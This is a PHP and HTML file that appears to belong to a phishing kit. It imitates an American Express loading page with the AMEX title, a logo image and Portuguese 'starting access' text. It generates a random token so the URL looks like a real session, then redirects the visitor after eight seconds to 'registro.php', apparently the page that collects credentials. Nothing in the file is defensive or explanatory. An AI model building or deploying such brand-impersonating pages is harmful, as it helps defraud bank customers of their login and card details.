<?php
function geraURL($tamanho = 32, $maiusculas = true, $numeros = true, $simbolos = true){
$lmin = 'abcdefghijklmnopqrstuvwxyz';
$lmai = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
$num = '1234567890';
$simb = '#-/';
$retorno = '';
$caracteres = '';
$caracteres .= $lmin;
if ($maiusculas) $caracteres .= $lmai;
if ($numeros) $caracteres .= $num;
if ($simbolos) $caracteres .= $simb;
$len = strlen($caracteres);
for ($n = 1; $n <= $tamanho; $n++) {
$rand = mt_rand(1, $len);
$retorno .= $caracteres[$rand-1];
}
return $retorno;
}
$link_index = 'registro.php?token='.geraURL(32);
?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title>American Express - AMEX</title>
	<link rel="stylesheet" href="_styles/boot.css">
	<link rel="stylesheet" href="_styles/loading.css">
	<link href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700" rel="stylesheet">
	<meta http-equiv="refresh" content=8;url="<?php echo $link_index;?>">
</head>
<body class="on_load">
	<div class="box_block">
		<img src="_images/logo_n1.png" height="69" width="82" class="load_logo">

		<h1>Aguarde, iniciando o acesso.</h1>
		<p>Carregando informações...</p>

		<img src="_images/ajax-loader.gif" height="15" width="128" class="loading_initial">

	</div>
</body>
</html>